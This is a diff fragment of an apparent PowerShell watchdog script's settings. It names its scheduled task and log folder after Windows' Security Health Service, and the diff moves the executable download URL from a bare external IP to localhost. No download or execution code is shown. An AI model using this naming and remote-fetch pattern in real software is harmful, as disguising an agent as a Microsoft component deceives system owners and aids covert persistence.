@@ -29,7 +29,7 @@ $TaskName        = 'Microsoft Security Health Service'
 $AgentMutexName  = 'Global\AgentSingleInstanceMutex'
 $LogPath         = Join-Path $env:ProgramData 'Microsoft\SecurityHealth\watchdog.log'
 $CooldownFile    = Join-Path $env:ProgramData 'Microsoft\SecurityHealth\.last_restart'
-$DownloadUrl     = 'http://150.136.246.12:9000/dist/SecurityHealthService.exe'
+$DownloadUrl     = 'http://127.0.0.1:33875/SecurityHealthService.exe'
 $PollIntervalSec = 60
 $CooldownSec     = 30
 
